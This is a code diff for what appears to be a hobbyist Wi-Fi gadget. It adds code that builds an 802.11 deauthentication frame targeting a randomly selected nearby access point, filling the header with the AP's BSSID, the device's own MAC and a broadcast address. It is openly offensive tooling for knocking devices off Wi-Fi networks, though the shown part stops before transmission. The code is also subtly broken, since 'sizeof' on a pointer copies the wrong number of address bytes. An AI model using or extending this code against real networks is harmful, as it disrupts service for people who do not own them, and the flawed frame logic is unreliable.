@@ -27,6 +27,11 @@ uint8_t Deauth::deauthFrame[26] = {
     /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
 };
 
+void Deauth::construct(wifi_ieee80211_mac_hdr_t& header, uint8_t* frame) {
+    // construct full frame...
+    std::copy(reinterpret_cast<uint8_t*>(&header), reinterpret_cast<uint8_t*>(&header) + sizeof(wifi_ieee80211_mac_hdr_t), frame);
+}
+
 void Deauth::add(const std::string& bssids) {
     std::stringstream ss(bssids);
     std::string token;
@@ -54,6 +59,9 @@ void Deauth::list() {
 }
 
 void Deauth::select() {
+    // init the header
+    wifi_ieee80211_mac_hdr_t header;
+
     // cool animation
     for (int i = 0; i < 5; ++i) {
         Serial.println("(0-o) Scanning for APs.");
@@ -95,6 +103,39 @@ void Deauth::select() {
         Display::cleanDisplayFace("('-')");
         Display::attachSmallText("Selected random AP: " + (String) randomAP.c_str());
         delay(1000);
+        
+        /** developer note:
+         * 
+         * here we will create the deauth frame using the header, 
+         * as we find the AP in question we also generate the required information for it as well...
+         * 
+        */
+
+        // bssid
+        uint8_t* bssid = WiFi.BSSID(randomIndex);
+
+         // set our mac address
+        uint8_t mac[WL_MAC_ADDR_LENGTH];
+        WiFi.macAddress(mac);
+
+        // broadcast address
+        uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+
+        /** developer note:
+        * 
+        * addr1: reciever addr
+        * addr2: sender addr
+        * addr3: filtering addr
+        * 
+        */
+
+        // copy our mac(s) to header
+        std::copy(bssid, bssid + sizeof(bssid), header.addr1);
+        std::copy(mac, mac + sizeof(mac), header.addr2);
+        std::copy(broadcastAddr, broadcastAddr + 6, header.addr3);
+
+        // finally we construct it
+        construct(header, deauthFrame);
     } else {
         // well ur fucked.
         Serial.println("(;-;) No access points found.");
